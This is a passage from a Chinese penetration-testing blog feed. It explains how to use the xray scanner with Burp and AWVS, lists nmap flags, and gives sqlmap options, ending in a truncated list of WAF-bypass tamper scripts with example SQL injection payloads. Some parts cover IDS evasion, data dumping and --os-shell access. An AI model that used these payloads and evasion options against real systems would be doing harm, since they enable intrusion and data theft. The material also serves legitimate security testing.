href="#webscan">¶</a><strong>webscan</strong></h3><p>在webscan后跟 <code>-h</code>查看webscan帮助</p><ol><li><strong>直接调用，扫描一个指定站点</strong></li></ol><p>./xray_windows_amd64.exe webscan --basic-crawler <a href="http://example.com/">http://example.com/</a></p><ol start="2"><li><strong>指定扫描输出</strong></li></ol><p>不指定输出时，默认输出到控制台的标准输出中，可以做管道处理，也可以选择输出为文件，如：</p><pre><code class="hljs">./xray_windows_amd64.exe webscan --url http://example.com/ --json-output report.json</code></pre><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">无参数：输出到控制台的标准输出 <br><br>--`text-output`：输出到文本文件中 <br><br>--`json-output`：输出到 JSON 文件中 <br><br>--`html-output`：输出到 HTML 文件中<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>抓包扫描</strong></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./xray_windows_amd64.exe webscan <span class="hljs-literal">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p>很多时候还会扫到 HTTPS 站点，可能会因为有代理而导致无法访问，或者需要手动确认安全风险。这时候需要我们导入 xray 运行目录下的ca.crt证书</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\xray_windows_amd64.exe genca<br>ca.crt ca.key config.yaml xray<br></code></pre></td></tr></table></figure><p>导入证书和bp一样（如果你不知道bp是什么，那建议先去了解bp）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./xray_windows_amd64.exe webscan <span class="hljs-literal">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><ol start="4"><li><strong>xray 与 Burpsuite 联动</strong></li></ol><p>首先 xray 建立起 webscan 的监听:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./xray.exe webscan --listen 127.0.0.1:7777 --html-output bp.html<br></code></pre></td></tr></table></figure><p>进入 Burp 后，打开 User options 标签页，然后找到 Upstream Proxy Servers 设置。</p><p>点击 Add 添加上游代理以及作用域，Destination host处可以使用*匹配多个任意字符串，?匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。</p><img src="/posts/8487c21c/1640526186117-d2910b64-38ca-47f1-bfa0-fb47ab1cf9ad.png" class title="img"><p>接下来 BP 正常抓包，与此同时 BP 也会将我们截取到的一些流量包发到 xray 中进行漏洞检测。</p><img src="/posts/8487c21c/1640526284826-313b79c2-8daa-4dce-8abb-3cf801f7b1e1.png" class title="img"><ol start="4"><li><h3 id="xray-与-AWVS-联动"><a class="header-anchor" href="#xray-与-AWVS-联动">¶</a>xray 与 AWVS 联动</h3><p>首先 xray 建立起 webscan 的监听：</p><p>如果你的AWVS不是安装在物理机上话，那么你的xray应该填写你AWVS可以访问的地址；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./xray.exe webscan --listen 192.168.1.105:7777 --html-output awvs.html   //本机ip，不要填127.0.0.1<br></code></pre></td></tr></table></figure><p>登入管理页后，点击 Targets, 然后点击 Add Target 添加扫描目标：</p><p>测试靶场：<a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a></p><img src="/posts/8487c21c/1640526732164-872d52a7-7713-486b-bf54-eda276a85a76.png" class title="img"><p>下滑到HTTP部分，填写Proxy Server为对应的xray代理：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1640526926018-df7c1cdb-9e2f-4e76-8f6b-38bbe1be94ef.png" alt="img"></p><p>扫描类型，仅爬取：</p><img src="/posts/8487c21c/1640527039148-c92635d7-a2a3-4ef5-a7be-45fa3c64ddfd.png" class title="img"><p>此时 AWVS 的爬虫会把请求都转发给 xray 检测漏洞了，此时awvs.html里面就躺好了漏洞：</p><img src="/posts/8487c21c/1640527162668-39dca769-d52f-4763-9665-0ec08fb101ba.png" class title="img"></li><li><p><strong>指定扫描插件</strong></p></li></ol><p>使用 --plugins 参数可以选择仅启用部分扫描插件，多个插件之间可使用逗号分隔，如：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./xray_windows_amd64.exe</span> webscan <span class="hljs-params">--plugins</span> cmd_injection <span class="hljs-params">--url</span> http:<span class="hljs-string">//example.com/</span><br></code></pre></td></tr></table></figure><p>插件支持和key:</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">SQL</span> 注入检测 (<span class="hljs-attribute">key</span>: sqldet)：   支持报错注入、布尔注入和时间盲注等<br><span class="hljs-selector-tag">XSS</span> 检测（<span class="hljs-selector-tag">key</span>: <span class="hljs-selector-tag">xss</span>）：         支持扫描反射型、存储型 <span class="hljs-selector-tag">XSS</span><br>命令/代码注入检测 (<span class="hljs-attribute">key</span>: cmd_injection)：     支持 <span class="hljs-selector-tag">shell</span> 命令注入、<span class="hljs-selector-tag">PHP</span> 代码执行、模板注入等<br>目录枚举 (<span class="hljs-attribute">key</span>: dirscan)：    检测备份文件、临时文件、<span class="hljs-selector-tag">debug</span> 页面、配置文件等<span class="hljs-number">10</span>余类敏感路径和文件<br>路径穿越检测 (<span class="hljs-attribute">key</span>: path_traversal)：     支持常见平台和编码<br><span class="hljs-selector-tag">XML</span> 实体注入检测 (<span class="hljs-attribute">key</span>: xxe)：    支持有回显和反连平台检测<br><span class="hljs-selector-tag">POC</span> 管理 (<span class="hljs-attribute">key</span>: phantasm)：    默认内置部分常用的 <span class="hljs-selector-tag">POC</span>，用户可以根据需要自行构建 <span class="hljs-selector-tag">POC</span> 并运行。可参考：<span class="hljs-selector-tag">POC</span> 编写文档（<span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//chaitin.github.io/xray/#/guide/poc）</span><br>文件上传检测 (<span class="hljs-attribute">key</span>: upload)：    支持检测常见的后端服务器语言的上传漏洞<br>弱口令检测 (<span class="hljs-attribute">key</span>: brute_force)：    支持检测 <span class="hljs-selector-tag">HTTP</span> 基础认证和简易表单弱口令，内置常见用户名和密码字典<br><span class="hljs-selector-tag">JSONP</span> 检测 (<span class="hljs-attribute">key</span>: jsonp)：    检测包含敏感信息可以被跨域读取的 <span class="hljs-selector-tag">jsonp</span> 接口<br><span class="hljs-selector-tag">SSRF</span> 检测 (<span class="hljs-attribute">key</span>: ssrf)：    <span class="hljs-selector-tag">ssrf</span> 检测模块，支持常见的绕过技术和反连平台检测<br>基线检查 (<span class="hljs-attribute">key</span>: baseline)：    检测低 <span class="hljs-selector-tag">SSL</span> 版本、缺失的或错误添加的 <span class="hljs-selector-tag">http</span> 头等<br>任意跳转检测 (<span class="hljs-attribute">key</span>: redirect)：    支持 <span class="hljs-selector-tag">HTML</span> <span class="hljs-selector-tag">meta</span> 跳转、<span class="hljs-number">30</span><span class="hljs-selector-tag">x</span> 跳转等<br><span class="hljs-selector-tag">CRLF</span> 注入 (<span class="hljs-attribute">key</span>: crlf_injection)：    检测 <span class="hljs-selector-tag">HTTP</span> 头注入，支持 <span class="hljs-selector-tag">query</span>、<span class="hljs-selector-tag">body</span> 等位置的参数<br></code></pre></td></tr></table></figure><ol start="5"><li><strong>自定义 POC</strong></li></ol><p>xray 支持用户使用 YAML 编写 POC。YAML 是 JSON 的超集，也就是说我们甚至可以用 JSON 编写 POC，但这里还是建议大家使用 YAML 来编写，原因如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">YAML</span> 格式的 “值” 无需使用双引号包裹，特殊字符无需转义<br>YAML 格式使内容更加可读<br>YAML 中可以使用注释<br></code></pre></td></tr></table></figure><ol start="6"><li><strong>反连平台</strong></li></ol><p>xray 在运行时会自动启动反连平台来辅助盲打扫描，可以在配置文件中修改反连平台的配置。目前支持 http 和 dns 两种反连机制，当服务端触发 payload 时 xray 会根据反连平台的状态判断漏洞是否存在。</p><p>dns 反连需要启用 root 权限监听 53 端口，并且将域名的 ns 记录指向反连平台的监听地址。</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>漏洞扫描</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nmap与sqlmap常用参数</title>
    <link href="/posts/4b05df7d.html"/>
    <url>/posts/4b05df7d.html</url>
    
    <content type="html"><![CDATA[<h1>nmap</h1><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff"><br><span class="hljs-deletion">-sS TCP SYN端口扫描（半连接）无日志记录</span><br><span class="hljs-deletion">-sT TCP全连接扫描 可能有日志 最精准</span><br><span class="hljs-deletion">-sA ack扫描 只能判断是否有防火墙</span><br><span class="hljs-deletion">-sU UDP端口扫描 </span><br><span class="hljs-deletion">-p [port] 指定扫描端口，可指定范围</span><br><span class="hljs-deletion">-p- 所有端口</span><br><span class="hljs-deletion">-T0~-T5 扫描线程，默认为T3 0、1用于IDS逃逸</span><br><span class="hljs-deletion">-v 增加输出详细程度</span><br><span class="hljs-deletion">-oN test.txt 输出到指定文件</span><br><span class="hljs-deletion">-sV 确认端口运行服务的版本</span><br><span class="hljs-deletion">-O os指纹识别</span><br><span class="hljs-deletion">-f 报文分段/IDS欺骗</span><br><span class="hljs-deletion">-D ip欺骗，可以指定多个ip使用[RND:]随机生成几个IP地址</span><br><span class="hljs-deletion">-A 启用操作系统检测，版本检测，脚本扫描和跟踪路由(梭哈！)</span><br><span class="hljs-deletion">--proxies 通过HTTP/SOCKS4代理中继连接</span><br> -n 不做DNS解析<br></code></pre></td></tr></table></figure><h1>sqlmap</h1><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">-u 指定目标网址<br>-r 抓包指定header头信息跑<span class="hljs-string">.-r</span>指定文件（文件中可能存在注入的参数用*标记）<br><span class="hljs-params">--dbs</span> 跑数据库<br><span class="hljs-params">--tables</span> 跑表名<br><span class="hljs-params">--columns</span> 跑字段<br><span class="hljs-params">--dump</span> 提取数据<br><span class="hljs-params">--count</span>获取表的数量<br>-D指定数据库<br>-T 指定表名<br>-C指定字段<br><span class="hljs-params">--batch</span> 自动选yes。 自动应答SQLMap所提出的配置选项<br><span class="hljs-params">--random-agent</span>随机请求头<br><span class="hljs-params">--user-agent=</span><span class="hljs-string">&quot;某请求头&quot;</span>指定某请求头<br><span class="hljs-params">--proxy</span> http:<span class="hljs-string">//127.0.0.1</span><span class="hljs-function">:8080</span>设置指定的代理<br><span class="hljs-params">--threads</span> x设置测试线程数<span class="hljs-params">(1-10)</span>，默认线程1,可以自己改大的线程<br><br><span class="hljs-comment">#漏洞探测等级</span><br><span class="hljs-params">--level</span><br><span class="hljs-params">--level</span> 1 默认的等级，会进行基本的测试，包括GET和POST方式 <br>  ○ <span class="hljs-params">--level</span> 2 在原有的基础上增加对cookie的检测 <br>  ○ <span class="hljs-params">--level</span> 3 增加对USER AGENT/REFERER的检测 （常用）<br>  ○ <span class="hljs-params">--level</span> 4 更多的payload来测试sql注入 <br>  ○ <span class="hljs-params">--level</span> 5 最高等级，包含所有的payload,会尝试自动破解出cookie、xff等头部注入（速度最慢）<br><span class="hljs-comment">#显示信息</span><br>● -v 显示调试信息的7个级别 （0-6）<br>  ○ 0只显示python错误以及严重的信息 <span class="hljs-params">(默认)</span><br>  ○ 1同时显示基本信息和警告信息 <br>  ○ 2同时显示debug信息 <br>  ○ 3同时显示注入的payload （常用）<br>  ○ 4同时显示http请求 <br>  ○ 5同时显示http响应头 <br>  ○ 6同时显示http响应页面 <br>  <br>  <br>  <span class="hljs-params">--shell</span><br>  条件：1.root权限 2. 知道绝对路径 3.PHP自动转义GPC关闭 4.secure_file_priv为空<br>    <span class="hljs-params">--os-shell</span>     获取交互式的操作系统的shell   <br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs mel">● SQLMAP使用脚本绕过  <br>  ○ sqlmap.py -u- url --tamper “脚本名称.py” <br>● SQLMAP常见绕过脚本（部分）<br>apostrophemask.py<br>适用数据库：ALL 作用：将引号替换为utf<span class="hljs-number">-8</span>，用于过滤单引号 使用脚本前：tamper(<span class="hljs-string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span> AND %EF%BC%871%EF%BC%87=%EF%BC%871<br><br>base64encode.py<br>适用数据库：ALL 作用：替换为base64编码 使用脚本前：tamper(<span class="hljs-string">&quot;1&#x27; AND SLEEP(5)#&quot;</span>) 使用脚本后：MScgQU5EIFNMRUVQKDUpIw==<br><br>multiplespaces.py<br>适用数据库：ALL 作用：围绕sql关键字添加多个空格 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION SELECT foobar&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> UNION SELECT foobar<br><br>space2plus.py<br>适用数据库：ALL 作用：用加号替换空格 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT+id+FROM+users<br><br>nonrecursivereplacement.py<br>适用数据库：ALL 作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将<span class="hljs-keyword">select</span>替换为空） 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION SELECT 2--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> UNIOUNIONN SELESELECTCT <span class="hljs-number">2</span>--<br><br>space2randomblank.py<br>适用数据库：ALL 作用：将空格替换为其他有效字符 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Did%0DFROM%0Ausers<br><br>unionalltounion.py<br>适用数据库：ALL 作用：将union allselect 替换为unionselect 使用脚本前：tamper(<span class="hljs-string">&#x27;-1 UNION ALL SELECT&#x27;</span>) 使用脚本后：<span class="hljs-number">-1</span> UNION SELECT<br><br>securesphere.py<br>适用数据库：ALL 作用：追加特定的字符串 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 1=1&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span> and <span class="hljs-string">&#x27;0having&#x27;</span>=<span class="hljs-string">&#x27;0having&#x27;</span><br><br>space2dash.py<br>适用数据库：ALL 作用：将空格替换为--，并添加一个随机字符串和换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=<span class="hljs-number">9227</span><br><br>space2mssqlblank.py<br>适用数据库：Microsoft SQL Server 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>、Microsoft SQL Server <span class="hljs-number">2005</span> 作用：将空格随机替换为其他空格符号(<span class="hljs-string">&#x27;%01&#x27;</span>, <span class="hljs-string">&#x27;%02&#x27;</span>, <span class="hljs-string">&#x27;%03&#x27;</span>, <span class="hljs-string">&#x27;%04&#x27;</span>, <span class="hljs-string">&#x27;%05&#x27;</span>, <span class="hljs-string">&#x27;%06&#x27;</span>, <span class="hljs-string">&#x27;%07&#x27;</span>, <span class="hljs-string">&#x27;%08&#x27;</span>, <span class="hljs-string">&#x27;%09&#x27;</span>, <span class="hljs-string">&#x27;%0B&#x27;</span>, <span class="hljs-string">&#x27;%0C&#x27;</span>, <span class="hljs-string">&#x27;%0D&#x27;</span>, <span class="hljs-string">&#x27;%0E&#x27;</span>, <span class="hljs-string">&#x27;%0F&#x27;</span>, <span class="hljs-string">&#x27;%0A&#x27;</span>) 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Eid%0DFROM%07users<br><br>between.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：用NOT BETWEEN <span class="hljs-number">0</span> AND #替换&gt; 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND A &gt; B--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND A NOT BETWEEN <span class="hljs-number">0</span> AND B--<br><br>percentage.py<br>适用数据库：ASP 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>, <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>, <span class="hljs-number">5.5</span><span class="hljs-number">.11</span>、PostgreSQL <span class="hljs-number">9.0</span> 作用：在每个字符前添加一个% 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM TABLE&#x27;</span>) 使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E<br><br>sp_password.py<br>适用数据库：MSSQL 作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227-- &#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">9227</span>=<span class="hljs-number">9227</span>-- sp_password<br><br>charencode.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：对给定的payload全部字符使用url编码（不处理已经编码的字符） 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM%20TABLE&#x27;</span>) 使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45<br><br>randomcase.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：随机大小写 使用脚本前：tamper(<span class="hljs-string">&#x27;INSERT&#x27;</span>) 使用脚本后：INseRt<br><br>charunicodeencode.py<br>适用数据库：ASP、ASP.NET 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>/<span class="hljs-number">2005</span>、MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>、PostgreSQL <span class="hljs-number">9.0</span><span class="hljs-number">.3</span> 作用：适用字符串的unicode编码 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD%20FROM TABLE&#x27;</span>) 使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045<br><br>space2comment.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：将空格替换为<span class="hljs-comment">/**/</span> 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT<span class="hljs-comment">/**/</span>id<span class="hljs-comment">/**/</span>FROM<span class="hljs-comment">/**/</span>users<br><br>equaltolike.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span> 作用：将=替换为LIKE 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT * FROM users WHERE id=1&#x27;</span>) 使用脚本后：SELECT * FROM users WHERE id LIKE <span class="hljs-number">1</span><br><br>equaltolike.py<br>测试通过数据库：MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：将&gt;替换为GREATEST，绕过对&gt;的过滤 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND A &gt; B&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND GREATEST(A,B+<span class="hljs-number">1</span>)=A<br><br>ifnull2ifisnull.py<br>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly) 测试通过数据库：MySQL <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span> 作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤 使用脚本前：tamper(<span class="hljs-string">&#x27;IFNULL(1, 2)&#x27;</span>) 使用脚本后：IF(ISNULL(<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br><br>modsecurityversioned.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.0</span> 作用：过滤空格，使用mysql内联注释的方式进行注入 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 2&gt;1--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> <span class="hljs-comment">/*!30874AND 2&gt;1*/</span>--<br><br>space2mysqlblank.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.1</span> 作用：将空格替换为其他空格符号(<span class="hljs-string">&#x27;%09&#x27;</span>, <span class="hljs-string">&#x27;%0A&#x27;</span>, <span class="hljs-string">&#x27;%0C&#x27;</span>, <span class="hljs-string">&#x27;%0D&#x27;</span>, <span class="hljs-string">&#x27;%0B&#x27;</span>) 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Bid%0DFROM%0Cusers<br><br>modsecurityzeroversioned.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.0</span> 作用：使用内联注释方式（<span class="hljs-comment">/*!00000*/</span>）进行注入 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 2&gt;1--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> <span class="hljs-comment">/*!00000AND 2&gt;1*/</span>--<br><br>space2mysqldash.py<br>适用数据库：MySQL、MSSQL 作用：将空格替换为 -- ，并追随一个换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>--%0AAND--%0A9227=<span class="hljs-number">9227</span><br><br>bluecoat.py<br>适用数据库：Blue Coat SGOS 测试通过数据库：MySQL <span class="hljs-number">5.1</span>,、SGOS 作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换= 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users where id = 1&#x27;</span>) 使用脚本后：SELECT%09id FROM users where id LIKE <span class="hljs-number">1</span><br><br>versionedkeywords.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">4.0</span><span class="hljs-number">.18</span>, <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>, <span class="hljs-number">5.5</span><span class="hljs-number">.11</span> 作用：注释绕过 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span><span class="hljs-comment">/*!UNION*/</span><span class="hljs-comment">/*!ALL*/</span><span class="hljs-comment">/*!SELECT*/</span><span class="hljs-comment">/*!NULL*/</span>,<span class="hljs-comment">/*!NULL*/</span>, CONCAT(CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">116</span>,<span class="hljs-number">58</span>),IFNULL(CAST(CURRENT_USER()<span class="hljs-comment">/*!AS*/</span><span class="hljs-comment">/*!CHAR*/</span>),CHAR(<span class="hljs-number">32</span>)),CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">100</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">58</span>))#<br><br>halfversionedmorekeywords.py<br>适用数据库：MySQL &lt; <span class="hljs-number">5.1</span> 测试通过数据库：MySQL <span class="hljs-number">4.0</span><span class="hljs-number">.18</span>/<span class="hljs-number">5.0</span><span class="hljs-number">.22</span> 作用：在每个关键字前添加mysql版本注释 使用脚本前：tamper(<span class="hljs-string">&quot;value&#x27; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;</span>) 使用脚本后：value<span 